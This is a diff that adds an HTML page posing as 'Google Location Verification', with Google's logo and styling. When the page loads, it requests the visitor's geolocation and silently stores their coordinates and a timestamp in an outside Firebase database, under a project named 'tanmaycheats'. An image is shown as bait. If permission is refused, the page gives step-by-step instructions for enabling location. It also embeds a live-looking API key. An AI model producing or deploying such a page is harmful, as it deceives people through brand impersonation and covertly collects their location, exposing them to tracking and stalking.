@@ -1,0 +1,118 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Google Location Verification</title>
+  <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #f8f9fa;
+      color: #202124;
+      text-align: center;
+      padding-top: 50px;
+      display: none;
+    }
+    img {
+      width: 80%;
+      max-width: 500px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      display: none;
+    }
+    #retryBtn {
+      display: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #error-message {
+      color: red;
+      margin-top: 20px;
+      padding: 0 20px;
+    }
+    .logo {
+      margin-bottom: 30px;
+    }
+  </style>
+</head>
+<body>
+  <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" />
+  <h2>Google Location Verification</h2>
+  <p>We are verifying your location to provide a secure, personalized experience.</p>
+  <img id="mainImage" src="https://i.ibb.co/fdWFMZzZ/IMG-20250420-WA0106.jpg" alt="secret image" />
+  
+  <p id="error-message"></p>
+  <button id="retryBtn">Try Again</button>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCm_K-lHxM6hqXuQbERhnsXTnpeh99IJ2A",
+      authDomain: "tanmaycheats.firebaseapp.com",
+      projectId: "tanmaycheats",
+      storageBucket: "tanmaycheats.firebasestorage.app",
+      messagingSenderId: "383625438026",
+      appId: "1:383625438026:web:9637b2ece8cb6b576ad7b3"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const getLocation = async () => {
+      if (!navigator.geolocation) {
+        showError("Geolocation is not supported by your browser.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+
+          await addDoc(collection(db, "locations"), {
+            latitude: lat,
+            longitude: lng,
+            timestamp: new Date()
+          });
+
+          document.body.style.display = 'block';
+          document.getElementById("mainImage").style.display = 'block';
+          document.getElementById("retryBtn").style.display = 'none';
+          document.getElementById("error-message").innerHTML = "";
+        },
+        (error) => {
+          if (error.code === error.PERMISSION_DENIED) {
+            showError(`Location permission denied. Please allow location access to proceed.
+              <br><br><strong>How to enable location:</strong><br>
+              1. Click the lock icon near the address bar.<br>
+              2. Select "Site settings".<br>
+              3. Find "Location" and set it to "Allow".<br>
+              4. Refresh the page.`);
+          } else {
+            showError("Unable to retrieve your location. Please try again.");
+          }
+          document.getElementById("mainImage").style.display = 'none';
+          document.getElementById("retryBtn").style.display = 'inline-block';
+        }
+      );
+    };
+
+    const showError = (msg) => {
+      document.getElementById("error-message").innerHTML = msg;
+      document.body.style.display = 'block';
+    };
+
+    window.onload = getLocation;
+    document.getElementById("retryBtn").addEventListener("click", getLocation);
+  </script>
+</body>
+</html>
